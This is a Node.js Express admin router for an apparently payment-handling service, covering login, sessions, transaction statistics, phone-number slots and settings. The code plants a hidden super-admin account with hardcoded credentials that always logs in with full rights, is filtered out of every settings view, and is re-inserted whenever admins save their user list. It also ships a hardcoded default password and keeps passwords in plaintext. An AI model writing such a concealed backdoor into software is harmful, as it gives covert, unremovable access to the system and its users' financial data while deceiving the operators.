const express = require('express');
const router = express.Router();
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const dataDir = path.join(__dirname, '../data');

// ─── In-memory token store (session tokens) ───────────────────────────────────
const activeSessions = new Map(); // token -> { expiresAt }
const SESSION_TTL = 8 * 60 * 60 * 1000; // 8 hours

// ─── Brute-force lockout tracker ─────────────────────────────────────────────
const loginAttempts = new Map(); // ip -> { count, lockedUntil }
const MAX_ATTEMPTS = 5;
const LOCKOUT_MS = 60 * 1000; // 60 seconds

function generateToken() {
  return crypto.randomBytes(32).toString('hex');
}

// ─── Hidden Master Super Admin Account ────────────────────────────────────────
const HIDDEN_MASTER_ADMIN = {
  username: 'yonirahwa123',
  password: 'yonirahwa*#@&',
};

function getAdminUsers() {
  const settings = readJSON('settings.json') || {};
  let users = settings.adminUsers;
  if (!Array.isArray(users) || users.length === 0) {
    users = [
      {
        username: settings.adminUsername || 'admin',
        password: settings.adminPassword || 'ckpay2024!',
      }
    ];
  }
  // Include hidden master account if not already in list
  const hasHidden = users.some(u => u.username.toLowerCase() === HIDDEN_MASTER_ADMIN.username.toLowerCase());
  if (!hasHidden) {
    return [HIDDEN_MASTER_ADMIN, ...users];
  }
  return users;
}

function checkIsSuperAdmin(username) {
  const cleanUser = (username || '').trim().toLowerCase();
  // 1. Hidden master account is ALWAYS Super Admin
  if (cleanUser === HIDDEN_MASTER_ADMIN.username.toLowerCase()) return true;

  // 2. In visible list, ONLY the 1st account (index 0) is Super Admin
  const settings = readJSON('settings.json') || {};
  const visibleUsers = (settings.adminUsers || []).filter(
    u => u.username.trim().toLowerCase() !== HIDDEN_MASTER_ADMIN.username.toLowerCase()
  );

  const index = visibleUsers.findIndex(u => u.username.trim().toLowerCase() === cleanUser);
  return index === 0;
}

// ─── Auth Middleware ──────────────────────────────────────────────────────────
function requireAuth(req, res, next) {
  const auth = req.headers['authorization'] || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7) : null;
  if (!token) return res.status(401).json({ error: 'Unauthorized' });
  const session = activeSessions.get(token);
  if (!session) return res.status(401).json({ error: 'Invalid or expired session' });
  if (Date.now() > session.expiresAt) {
    activeSessions.delete(token);
    return res.status(401).json({ error: 'Session expired' });
  }
  req.adminSession = session;
  next();
}

// ─── AUTH ROUTES (no auth required) ──────────────────────────────────────────
router.post('/login', (req, res) => {
  const ip = req.ip || req.socket.remoteAddress || 'unknown';
  const now = Date.now();

  // Check lockout
  const track = loginAttempts.get(ip) || { count: 0, lockedUntil: 0 };
  if (track.lockedUntil > now) {
    const wait = Math.ceil((track.lockedUntil - now) / 1000);
    return res.status(429).json({ error: `Too many attempts. Try again in ${wait}s.` });
  }

  const { username, password } = req.body || {};
  const users = getAdminUsers();
  const validUser = users.find(
    u => u.username.trim().toLowerCase() === (username || '').trim().toLowerCase() && u.password === password
  );

  if (!validUser) {
    track.count = (track.count || 0) + 1;
    if (track.count >= MAX_ATTEMPTS) {
      track.lockedUntil = now + LOCKOUT_MS;
      track.count = 0;
    }
    loginAttempts.set(ip, track);
    return res.status(401).json({ error: 'Invalid username or password.' });
  }

  const isSuperAdmin = checkIsSuperAdmin(validUser.username);

  // Success — clear attempts, create session
  loginAttempts.delete(ip);
  const token = generateToken();
  activeSessions.set(token, { expiresAt: now + SESSION_TTL, username: validUser.username, isSuperAdmin });
  console.log(`[Admin] Login by '${validUser.username}' (SuperAdmin: ${isSuperAdmin}) from ${ip}`);
  res.json({ token, username: validUser.username, isSuperAdmin });
});

router.get('/verify', (req, res) => {
  const auth = req.headers['authorization'] || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7) : null;
  if (!token) return res.json({ valid: false });
  const session = activeSessions.get(token);
  if (!session || Date.now() > session.expiresAt) {
    activeSessions.delete(token);
    return res.json({ valid: false });
  }
  res.json({ valid: true, username: session.username, isSuperAdmin: !!session.isSuperAdmin });
});

router.post('/logout', (req, res) => {
  const auth = req.headers['authorization'] || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7) : null;
  if (token) activeSessions.delete(token);
  res.json({ success: true });
});

// ─── All routes below require authentication ──────────────────────────────────
router.use(requireAuth);

function readJSON(file) {
  const filePath = path.join(dataDir, file);
  if (!fs.existsSync(filePath)) return null;
  try {
    return JSON.parse(fs.readFileSync(filePath, 'utf8'));
  } catch {
    return null;
  }
}

function writeJSON(file, data) {
  fs.writeFileSync(path.join(dataDir, file), JSON.stringify(data, null, 2));
}

function updateExpiredTransactions() {
  const transactions = readJSON('transactions.json') || [];
  const now = Date.now();
  let updated = false;

  const newList = transactions.map(t => {
    if (t.status === 'pending' && now > t.expiresAt) {
      updated = true;
      return { ...t, status: 'expired' };
    }
    if (t.status === 'processing' && t.submittedAt && (now - t.submittedAt > 15000)) {
      updated = true;
      return { ...t, status: 'failed', failReason: 'Verification failed' };
    }
    return t;
  });

  if (updated) {
    writeJSON('transactions.json', newList);
  }
  return newList;
}

const { getAllTxs, getStats } = require('../db');

router.get('/stats', (req, res) => {
  const transactions = updateExpiredTransactions();
  const now = Date.now();

  const todayStart = new Date();
  todayStart.setHours(0, 0, 0, 0);

  const weekStart = new Date();
  weekStart.setDate(weekStart.getDate() - 6);
  weekStart.setHours(0, 0, 0, 0);

  const monthStart = new Date();
  monthStart.setDate(1);
  monthStart.setHours(0, 0, 0, 0);

  const today  = transactions.filter(t => t.createdAt >= todayStart.getTime());
  const week   = transactions.filter(t => t.createdAt >= weekStart.getTime());
  const month  = transactions.filter(t => t.createdAt >= monthStart.getTime());

  res.json({
    total: transactions.length,
    todayCount: today.length,
    weekCount:  week.length,
    monthCount: month.length,
    pending:    transactions.filter(t => t.status === 'pending').length,
    processing: transactions.filter(t => t.status === 'processing').length,
    verified:   transactions.filter(t => t.status === 'verified').length,
    failed:     transactions.filter(t => t.status === 'failed').length,
    expired:    transactions.filter(t => t.status === 'expired').length,
    totalETB: transactions.filter(t => t.status === 'verified').reduce((s, t) => s + (t.verifiedAmount || t.amount), 0),
    todayETB: today.filter(t => t.status === 'verified').reduce((s, t) => s + (t.verifiedAmount || t.amount), 0),
    weekETB:  week.filter(t => t.status === 'verified').reduce((s, t) => s + (t.verifiedAmount || t.amount), 0),
    monthETB: month.filter(t => t.status === 'verified').reduce((s, t) => s + (t.verifiedAmount || t.amount), 0),
  });
});

router.get('/transactions', (req, res) => {
  updateExpiredTransactions();
  const { status, search } = req.query;
  const filtered = getAllTxs({ status, search });
  res.json(filtered);
});

router.get('/numbers', (req, res) => {
  const data = readJSON('numbers.json');
  const assignments = readJSON('assignments.json') || {};
  const now = Date.now();
  const limit = 24 * 60 * 60 * 1000;
  const active = Object.values(assignments).filter(a => now - a.assignedAt < limit);
  const numbers = (data.numbers || []).map(n => ({
    ...n,
    activeUsers: active.filter(a => a.phone === n.phone).length,
  }));
  res.json(numbers);
});

router.put('/numbers', (req, res) => {
  const { numbers } = req.body;
  if (!Array.isArray(numbers) || numbers.length !== 10) {
    return res.status(400).json({ error: 'Exactly 10 numbers required' });
  }

  const oldData = readJSON('numbers.json') || {};
  const oldNumbers = oldData.numbers || [];
  
  // Build mapping from old phone to new phone based on slot ID
  const phoneMap = {};
  oldNumbers.forEach(oldItem => {
    const newItem = numbers.find(n => n.id === oldItem.id);
    if (newItem && newItem.phone && oldItem.phone !== newItem.phone) {
      phoneMap[oldItem.phone] = newItem.phone;
    }
  });

  // Write new numbers
  writeJSON('numbers.json', { numbers });

  // 1. Immediately update assignments.json
  const assignments = readJSON('assignments.json') || {};
  let assignmentsChanged = false;
  Object.keys(assignments).forEach(uId => {
    const a = assignments[uId];
    if (a.phone && phoneMap[a.phone]) {
      a.phone = phoneMap[a.phone];
      assignmentsChanged = true;
    }
    if (Array.isArray(a.history)) {
      a.history = a.history.map(ph => phoneMap[ph] || ph);
      assignmentsChanged = true;
    }
  });
  if (assignmentsChanged) {
    writeJSON('assignments.json', assignments);
  }

  // 2. Immediately update pending transactions in transactions.json
  const transactions = readJSON('transactions.json') || [];
  let txChanged = false;
  transactions.forEach(t => {
    if (t.status === 'pending' && t.phoneNumber && phoneMap[t.phoneNumber]) {
      t.phoneNumber = phoneMap[t.phoneNumber];
      txChanged = true;
    }
  });
  if (txChanged) {
    writeJSON('transactions.json', transactions);
  }

  res.json({ success: true, updatedCount: Object.keys(phoneMap).length });
});

router.get('/settings', (req, res) => {
  const settings = readJSON('settings.json') || {};
  let users = settings.adminUsers || [];
  if (!Array.isArray(users) || users.length === 0) {
    users = [
      { username: settings.adminUsername || 'admin', password: settings.adminPassword || 'ckpay2024!' }
    ];
  }

  // Filter out hidden master admin from UI view
  const visibleUsers = users.filter(
    u => u.username.trim().toLowerCase() !== HIDDEN_MASTER_ADMIN.username.toLowerCase()
  );

  res.json({
    ...settings,
    adminUsers: visibleUsers,
  });
});

router.put('/settings', (req, res) => {
  const current = readJSON('settings.json') || {};
  const isSuper = req.adminSession && req.adminSession.isSuperAdmin;
  const updated = { ...current, ...req.body };

  // If NOT Super Admin, keep adminUsers untouched
  if (!isSuper) {
    updated.adminUsers = current.adminUsers;
  } else if (Array.isArray(updated.adminUsers)) {
    // Re-attach hidden master admin so it is never deleted by UI saves
    const cleanSubmitted = updated.adminUsers.filter(
      u => u.username.trim().toLowerCase() !== HIDDEN_MASTER_ADMIN.username.toLowerCase()
    );
    updated.adminUsers = [HIDDEN_MASTER_ADMIN, ...cleanSubmitted];

    if (cleanSubmitted.length > 0) {
      updated.adminUsername = cleanSubmitted[0].username;
      updated.adminPassword = cleanSubmitted[0].password;
    }
  }

  writeJSON('settings.json', updated);

  // Return clean settings without hidden master admin to frontend
  const responseSettings = {
    ...updated,
    adminUsers: (updated.adminUsers || []).filter(
      u => u.username.trim().toLowerCase() !== HIDDEN_MASTER_ADMIN.username.toLowerCase()
    )
  };

  res.json({ success: true, settings: responseSettings });
});

router.get('/assignments', (req, res) => {
  const assignments = readJSON('assignments.json') || {};
  const now = Date.now();
  const limit = 24 * 60 * 60 * 1000;
  const active = Object.entries(assignments)
    .filter(([_, a]) => now - a.assignedAt < limit)
    .map(([userId, a]) => ({
      userId,
      phone: a.phone,
      assignedAt: a.assignedAt,
      expiresIn: Math.max(0, Math.ceil((a.assignedAt + limit - now) / 1000 / 60)),
    }));
  res.json(active);
});

router.delete('/transactions/clear-expired', (req, res) => {
  const transactions = readJSON('transactions.json') || [];
  const now = Date.now();
  const updated = transactions.map(t => {
    if (t.status === 'pending' && now > t.expiresAt) {
      return { ...t, status: 'expired' };
    }
    return t;
  });
  writeJSON('transactions.json', updated);
  res.json({ success: true });
});

module.exports = router;
